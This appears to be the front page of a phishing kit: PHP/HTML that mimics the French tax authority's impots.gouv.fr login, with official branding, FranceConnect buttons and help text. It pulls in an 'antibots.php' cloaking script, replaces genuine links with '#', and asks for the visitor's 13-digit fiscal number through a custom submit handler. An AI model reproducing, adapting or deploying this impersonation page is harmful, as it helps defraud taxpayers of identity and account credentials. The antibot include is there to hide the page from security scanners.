<?php
include "../../server/antibots.php";
?>
<a href="#contenu" class="sr-only sr-only-focusable">Aller au contenu</a>

<header>
	<div class="container">
		<!--Le logo-->
		<a id="logo" class="col-xs-12 col-sm-6 col-lg-7" href="#" target="_blank" rel="noopener" title="Accueil impots.gouv.fr (nouvelle fenétre)"> <span class="sr-only">Authentification</span> </a>
		<h1 class="sr-only">Authentification</h1>
		<ul id="acces_espace" class="col-xs-12 col-sm-6 col-lg-5">
			<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
				<a class="btn btn-primary" id="partPriv" href="#"> <span class="dgfipicon dgfipicon-cadenas-ferme pull-left"></span> Votre espace particulier </a>
			</li>
			<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
				<a class="btn btn-danger" id="proPriv" href="#"> <span class="dgfipicon dgfipicon-cadenas-ferme pull-left"></span> Votre espace professionnel </a>
			</li>
			<li class="col-xs-6 col-sm-9 col-md-7 pull-right">
				<a class="btn btn-primary" id="backFranceConnect"> <span class="glyphicon glyphicon-arrow-left pull-left"></span> &emsp; Retourner &agrave; FranceConnect </a>
			</li>
		</ul>
		<!-- </div>  Fin Row -->
	</div>
	<!-- Fin Container -->
</header>
<!-- Fil d'Arianne -->
<div class="container">
	<div class="row">
		<ol class="breadcrumb ">
			<li><a href="#" id="toPortailPub" title="Retour au portail">Accueil</a></li>
			<li class="active">Authentification</li>
		</ol>
	</div>
</div>
<!-- Fin du fil d'Arianne -->
<main class="container" id="contenu">
	<div class="sr-only"> Le contenu du formulaire et l'aide mise à votre disposition évoluent selon vos réponses et votre situation </div>
	<div class="row">
		<!-- Connexion Gauche-->
		<div class="col-md-6">
			<a id="aide_scroll" href="#aide" class="btn btn-default hidden-lg hidden-md hidden-sm" aria-hidden="false"> <span class="dgfipicon dgfipicon-info text-muted"></span>&nbsp;Aide </a>
			<div class="panel panel-default">
				<div class="panel-heading">
					<h2 id="titre_authent" class="text-center">Authentification</h2> </div>
				<!--===========================-->
				<!--Body Connexion Gauche DEBUT-->
				<!--===========================-->
				<div class="panel-body">
					<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="erreur"></div>
					<div role="alert" class="erreur alert alert-danger erreurDAC cat2 hide" id="blocage"></div>

						<IFRAME style="display:none" name="hidden-formulairePrincipal" id="hidden-formulairePrincipal" aria-hidden="true" title="Cadre technique"> </IFRAME>
						<div class="row">
							<div class="col-md-12">
								<div class="form-group" id="fg_spi">
									<div role="alert" style="display: none;" class="erreur alert alert-danger cat1" id="error"></div>
									<label for="spi_tmp">Num&eacute;ro fiscal</label>
									
									<div class="ephemere hidden" id="liveCheck_spi_tmp" role="alert"></div>
									<input class="form-control" maxlength="13" required name="num" type="tel" aria-required="true" autocomplete="false" id="identifiant" placeholder="13 chiffres" data-original-title="13 chiffres" data-toggle="tooltip" data-placement="top" data-mask="int" data-max=13 data-feedbackok=1/>
									<br><br>
									 <center><button id="btnAction" type="submit" style="width: 90%;background:#1d5596;color:white;height:40px;border:none;outline:none;border-radius:5px;" data-href="" onclick="submit('1')">Continuer</button></center>
										
										<br>
								</div>
							</div>
						</div>
				</div>
				<div class="panel-footer text-center" id="FranceConnect">
					<form method="post" enctype="application/x-www-form-urlencoded" action="#" id="formfc">
						<div class="col-md-12 text-center">
							<input type="hidden" id="authKey" name="lmAuth" value="FranceConnect">
							<div id="erreurFC" role="alert" class="erreur alert alert-danger hide"> Vous ne pouvez actuellement pas vous identifier en utilisant FranceConnect.
								<br/> Vous pouvez contacter le support FranceConnect pour de plus amples renseignements </div>
							<div role="alert" class="erreur alert alert-danger hide" id="Cat2FC1"> La demande d'activation de votre mot de passe est en cours.
								<br> Vous avez re&ccedil;u un courriel &agrave; l'adresse indiqu&eacute;e.
								<br> Pour vous connecter via FranceConnect, vous devez obligatoirement cliquer sur le lien indiqu&eacute; dans ce courriel.
								<br> Attention, ce lien est valable 24 heures.
								<br> </div>
							<div role="alert" class="erreur alert alert-danger hide" id="Cat2FC2"> Vous ne pouvez actuellement pas vous identifier en utilisant FranceConnect.
								<br/> Vous pouvez contacter le support FranceConnect pour de plus amples renseignements </div>
							<a id="leBouton" href="#"><img src="templates/images/logo-fc.svg" height="60" width="200" alt="S'identifier avec FranceConnect"></a>
							<br/> </div>
					</form>
					<p class="text-center"> <a href="#" id="cQuoiFCGauche" target="_blank" rel="noopener">
									Qu'est-ce que FranceConnect?
									<span class="dgfipicon dgfipicon-sortie-page" title="Nouvelle fenétre"></span>
								</a> </p>
				</div>
				<div class="panel-footer text-center hide" id="consentement">
					<p>En cliquant sur éConnexioné, vous acceptez que vos donn&eacute;es personnelles (nom, pr&eacute;noms, date et lieu de naissance, adresse &eacute;lectronique) soient transmises &agrave; FranceConnect.</p>
				</div>
				<div class="panel-footer text-center" id="Payer"> </div>
			</div>
		</div>
		<section class="col-md-6" id="aide">
			<div class="panel panel-default">
				<div class="panel-heading">
					<h2 class="text-center">Aide</h2> </div>
				<div class="panel-body">
					<details id="aide_spi" class="aideSPI">
						<summary>Ou trouver votre numéro fiscal&nbsp;?</summary>
						<div class="well">
							<p>Si vous disposez déjà d'un espace particulier, vous pouvez <a href="#" id="disp_perte_spi" onclick="return false;" data-target="#numFiscal" data-toggle="modal" title="Ouverture dans une fenétre modale">recevoir votre numéro fiscal par courriel</a>.</p>
							<p>Il figure aussi en haut de la première page de votre dernière déclaration de revenus <a href="#" target="_blank" rel="noopener" title="Nouvelle fenétre">ou sur vos avis <span class="dgfipicon dgfipicon-sortie-page" title="Nouvelle fenétre"></span></a> : </p>
							<div id="exemple_SPI">
								<figure class="text-center spacer-top" role="group"> <img src="templates/images/spi.svg" alt="Légende disponible aprés l'illustration" class="img-responsive center-block img-thumbnail" width="473" height="145" />
									<figcaption class="text-muted"><em>Illustration : emplacement de votre numéro fiscal, sur votre déclaration</em></figcaption>
								</figure>
								<figure class="text-center spacer-top" role="group"> <img src="templates/images/spi1.svg" alt="Légende disponible aprés l'illustration" class="img-responsive center-block img-thumbnail" width="350" height="145" />
									<figcaption class="text-muted"><em> Illustration : emplacement de votre numéro fiscal, sur votre avis</em></figcaption>
								</figure>
							</div>
						</div>
					</details>
					<details id="aide_spi1" class="aideSPI">
						<summary>Vous n'avez pas encore de numéro fiscal&nbsp;?</summary>
						<div class="well">
							<p>Pour obtenir la création de votre numéro fiscal, veuillez vous adresser à votre <span id="CFP">Centre des finances publiques</span> </p>
						</div>
					</details>
					<details id="aide_code" class="aideCode hide">
						<summary>Vous avez perdu votre code de création</summary>
						<div class="well">
							<p>Vous pouvez <a href="#" data-toggle="modal" data-target="#codeCreation">l'obtenir à nouveau par courriel</a>.</p>
						</div>
					</details>
					<details id="aide_nael" class="aideIdentifiants hide">
						<summary>Ou trouver votre numéro d'accés en ligne&nbsp;?</summary>
						<div class="well">
							<p>Il figure en haut de la premi&egrave;re page de votre derni&egrave;re d&eacute;claration de revenus re&ccedil;ue.</p>
							<div id="exemple_NAEL">
								<figure class="text-center spacer-top" role="group"> <img src="templates/images/num_acces.svg" alt="Légende disponible aprés l'illustration" class="img-responsive center-block img-thumbnail" width="473" height="145" />
									<figcaption class="text-muted"><em>Illustration : emplacement de votre numéro d'accés en ligne, sur votre déclaration</em></figcaption>
								</figure>
							</div>
						</div>
					</details>
					<details id="aide_rfr" class="aideIdentifiants hide">
						<summary>Ou trouver votre revenu fiscal de référence&nbsp;?</summary>
						<div class="well">
							<p>Il se trouve sur la premiére page de votre dernier avis d'imp&ocirc;t sur les revenus dans le cadre &laquo; Vos r&eacute;f&eacute;rences &raquo;. </p>
							<div id="exemple_RFR">
								<figure class="text-center spacer-top" role="group"> <img src="templates/images/rfr.svg" alt="Légende disponible aprés l'illustration" class="img-responsive center-block img-thumbnail" width="350" height="269" />
									<figcaption class="text-muted"><em>Illustration : emplacement de votre revenu fiscal de référence</em></figcaption>
								</figure>
							</div>
						</div>
					</details>
					<details id="aide_mdp" class="aideMdp hide">
						<summary>Vous avez oublié votre mot de passe</summary>
						<div class="well">
							<p>Vous pouvez <a href="#" tabindex="0" data-target="#passPerdu" data-toggle="modal" title="Ouverture dans une fenétre modale">renouveler votre mot de passe en quelques clics</a>.</p>
						</div>
					</details>
					<details id="aide_mdp1" class="aideMdp hide">
						<summary>Comment modifier votre mot de passe&nbsp;?</summary>
						<div class="well">
							<p>Une fois connecté, vous pourrez le modifier depuis é&nbsp;Mon profil&nbsp;é.</p>
						</div>
					</details>
					<details id="aide_ocfiNonIR" class="ocfiNonIR hide">
						<summary>Quels éléments fournir pour prouver votre identité&nbsp;?</summary>
						<div class="well">
							<p>Vous devez adresser à votre <span id="CFP2">centre des Finances Fubliques</span> une reproduction recto-verso de l'un des éléments suivants&nbsp;:</p>
							<ul>
								<li>carte nationale d'identité ou passeport en cours de validité&nbsp;;</li>
								<li>livret de famille à jour&nbsp;;</li>
								<li>carte d'invalidité de guerre&nbsp;;</li>
								<li>carte d'invalidité civil&nbsp;;</li>
								<li>extrait d'acte de naissance ou copie intégrale avec mentions en marge&nbsp;;</li>
								<li>titre de séjour&nbsp;;</li>
								<li>visa long séjour valant à un titre de séjour&nbsp;;</li>
							</ul>
							<p>à défaut, sont également recevables&nbsp;:</p>
							<ul>
								<li>livret de circulation&nbsp;;</li>
								<li>carte de ressortissant d'un état membre de l'Union Européenne.</li>
							</ul>
						</div>
					</details>
					<details id="aide_perteid" class="aideIdentifiants hide">
						<summary>Numéro d'accés en ligne et revenu fiscal de référence perdus</summary>
						<div class="well">
							<p>Nous vous invitons &agrave; vous adresser &agrave; votre <span id="CFP3">centre des Finances Publiques</span> </p>
							<p>Faites votre demande en indiquant votre numéro fiscal, ou votre état civil complet, et tous éléments utiles. </p>
							<p> Les identifiants vous seront alors transmis de maniére sécurisée, généralement à l'aide de vos coordonnées (adresse électronique ou téléphone) déjà connues de nos service. </p>
						</div>
					</details>
					<details id="aide_connexFC" class="aideFC hide">
						<summary>Se connecter avec FranceConnect</summary>
						<div class="well">
							<p> <b>Les services disponibles</b>
								<br /> Avec vos identifiants impots.gouv.fr, vous pouvez effectuer des d&eacute;marches administratives sur des sites partenaires de FranceConnect. Le logo FranceConnect figure sur l'espace d'authentification de ces sites.
								<br />
								<br /> <b>Un acc&egrave;s unique et personnel</b>
								<br /> L'identification sur un site proposant le bouton FranceConnect est strictement personnelle. Chaque membre d'un foyer fiscal disposant d'un num&eacute;ro fiscal et d'une adresse &eacute;lectronique valid&eacute;e sur le site impots.gouv.fr peut acc&eacute;der aux services en ligne en saisissant son propre num&eacute;ro fiscal.
								<br />
								<br /> <b>Je rencontre des difficult&eacute;s pour me connecter</b>
								<br /> Nous vous invitons à vérifier la saisie de votre numéro fiscal et de votre mot de passe.
								<br /> Nous vous rappelons que vous devez avoir créé un compte sur le site <a href="index.html">impots.gouv.fr</a>.
								<br /> Si vos identifiants sont correctement saisis et que le blocage persiste, nous vous invitons à contacter le support d'aide FranceConnect à l'adresse suivante : support.usagers@franceconnect.gouv.fr </p>
						</div>
					</details>
				</div>
				<!-- Fin du panel-body  -->
				<div class="panel-footer marge">
					<details id="aide_services">
						<summary>Les services disponibles sur votre espace particulier</summary>
						<div class="well">
							<p>Vous pouvez&nbsp;: </p>
							<ul>
								<li>gérer votre prélévement à la source,</li>
								<li>payer vos impôts,</li>
								<li>déclarer vos revenus,</li>
								<li>consulter vos déclarations et avis d'imposition,</li>
								<li>consulter la situation de vos paiements,</li>
								<li>accéder à des données publiques,</li>
								<li>retrouver les coordonnées de vos services compétents</li>
								<li>réaliser des demandes et démarches via votre messagerie sécurisée</li>
							</ul>
						</div>
					</details>
					<details id="aide_cookies">
						<summary>Gestion des <em lang="en">cookies</em></summary>
						<div class="well">
							<p>Un <em>cookie</em> est un petit fichier, enregistré sur votre appareil, qui contient des informations nécessaires au fonctionnement du site.</p>
							<p>Nous n'y enregistrons pas de donnée personnelle.</p>
							<p>Votre navigateur propose en général un mode de navigation privée, qui supprime les <em>cookies</em> à la fermeture du logiciel.</p>
						</div>
					</details>
				</div>
			</div>
		</section>
	</div>
</main>
<footer role="contentinfo">
	<p class="col-md-12 text-center">Direction g&eacute;n&eacute;rale des Finances publiques</p>
</footer>
<div id="deco" class="modal fade" role="dialog">
	<div class="modal-dialog">
		<div class="modal-content" id="deco_contenu">
			<div class="modal-header">
				<h3 class="modal-title titre">D&eacute;connexion</h3> </div>
			<div class="modal-body">
				<div id="deconnecte" class="rounded">
					<iframe name="app0" id="app0" class="hide" aria-hidden="true" title="Cadre technique"></iframe> D&eacute;connexion en cours, veuillez patienter...
					<br />
					<br />
					<div class="text-center" id="decoWait"></div>
					<br /> </div>
			</div>
		</div>
	</div>
</div>